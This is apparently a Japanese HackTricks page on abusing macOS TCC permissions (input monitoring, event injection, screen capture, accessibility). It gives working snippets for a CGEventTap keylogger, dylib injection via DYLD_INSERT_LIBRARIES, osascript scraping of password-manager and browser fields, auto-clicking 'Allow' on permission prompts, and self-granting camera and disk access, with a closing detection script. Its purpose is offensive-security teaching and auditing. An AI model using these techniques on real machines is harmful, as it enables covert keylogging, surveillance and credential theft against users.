# macOS 入力監視、画面キャプチャ & Accessibility の悪用

{{#include ../../../banners/hacktricks-training.md}}

## 概要

3つの関連する TCC サービスが、アプリケーションがユーザーのデスクトップセッションを観察・操作する方法を制御します:

| TCC Service | 権限 | 機能 |
|---|---|---|
| `kTCCServiceListenEvent` | **Input Monitoring** | システム全体のすべてのキーボードとマウスイベントを読み取る (keylogging) |
| `kTCCServicePostEvent` | **Input Injection** | 合成のキーボードおよびマウスイベントを注入する |
| `kTCCServiceScreenCapture` | **Screen Capture** | ディスプレイバッファを読み取り、スクリーンショット取得、画面録画 |
| `kTCCServiceAccessibility` | **Accessibility** | AXUIElement API 経由で他のアプリケーションを制御し、UI 要素を読み取る |

これらの権限は **最も危険な組み合わせ** であり、組み合わせると以下を可能にします:
- すべてのキーストロークの完全な記録 (keylogging)（パスワード、メッセージ、クレジットカード）
- 表示されているすべてのコンテンツの画面録画
- 合成入力の注入（ボタンをクリック、ダイアログを承認）
- 物理的アクセスと同等の完全な GUI 制御

---

## Input Monitoring (kTCCServiceListenEvent)

### 仕組み

macOS は **`CGEventTap` API** を使用して、Quartz イベントシステムからの入力イベントをプロセスがインターセプトできるようにします。ListenEvent 権限を持つプロセスは、対象アプリケーションに到達する前後に **すべてのキーボードおよびマウスイベント** を受け取るイベントタップを作成できます。
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### Entitled Binaries を見つける
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### 攻撃: Keylogging via Code Injection

ListenEvent permission を持つバイナリが **disabled library validation** または **allows DYLD environment variables** を持っている場合、攻撃者は CGEventTap を登録する dylib を注入できます:
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
インジェクトされた dylib はターゲットの ListenEvent TCC grant を継承し、すべてのキー入力を取得します。

### Attack: Credential Harvesting

高度な keylogger はキー入力をアクティブなアプリケーションと関連付けることができます:
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## Input Injection (kTCCServicePostEvent)

### 仕組み

PostEvent permission により、ListenOnly の代わりに **`kCGEventTapOptionDefault`**（events を変更/注入できる）を使った event tap を作成できる。これにより次のことが可能になる:
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### 攻撃: Automated TCC Prompt Approval

PostEvent を使用すると、攻撃者は TCC の許可ダイアログで **"Allow" をクリックする操作をシミュレート** できます:
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## Screen Capture (kTCCServiceScreenCapture)

### 仕組み

画面キャプチャの許可は、ディスプレイバッファの読み取りを次の方法で可能にします:
- **`CGWindowListCreateImage`** — 任意のウィンドウまたは画面全体をキャプチャする
- **`ScreenCaptureKit`** (macOS 12.3+) — 画面コンテンツをストリーミングするための最新のAPI
- **`CGDisplayStream`** — ハードウェアアクセラレーションによる画面キャプチャ
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### スクリーンキャプチャクライアントの検出
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### Attack: Credential Capture via OCR

注入された screen capture process は定期的に frames をキャプチャし、OCR を使って passwords を抽出できます：
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> **macOS Sonoma**以降、スクリーンキャプチャはメニューバーに**持続的なインジケータ**を表示します。以前のバージョンでは、スクリーン録画は完全にサイレントになることがありました。ただし、短時間の単一フレームのキャプチャはユーザーに気付かれない可能性があります。

### Attack: Session Recording

継続的なスクリーン録画は、ユーザーのセッションを完全に再現します:
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## アクセシビリティ (kTCCServiceAccessibility)

### 仕組み

アクセシビリティへのアクセスにより、**AXUIElement API** を介して他のアプリケーションを制御できます。アクセシビリティ権限を持つプロセスは以下を行うことができます:

1. **Read** 任意のアプリケーション内のあらゆる UI 要素（テキストフィールド、ラベル、ボタン、メニュー）を読み取る
2. **Click** ボタンをクリックし、コントロールを操作する
3. **Type** 任意のテキストフィールドにテキストを入力する
4. **Navigate** メニューやダイアログをナビゲートする
5. **Scrape** 実行中の任意のアプリケーションから表示されているデータを取得する
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### Attack: Self-Granting TCC Permissions

最も危険な accessibility abuse は **System Settings を操作して自分の malware に追加の権限を与えること**:
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### 攻撃: Cross-Application Data Scraping
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### Attack: 自動化されたユーザー操作
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## 攻撃チェーン

### チェーン: Input Monitoring + Screen Capture = 完全な監視
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### チェーン: Accessibility + PostEvent = 完全なリモート制御
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### チェーン: アクセシビリティ → カメラ/マイクの自己付与 → 監視
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
---
## 検出と列挙
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## 参考資料

* [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
* [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
* [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
* [Objective-See — Accessibility Abuse as TCC Bypass](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
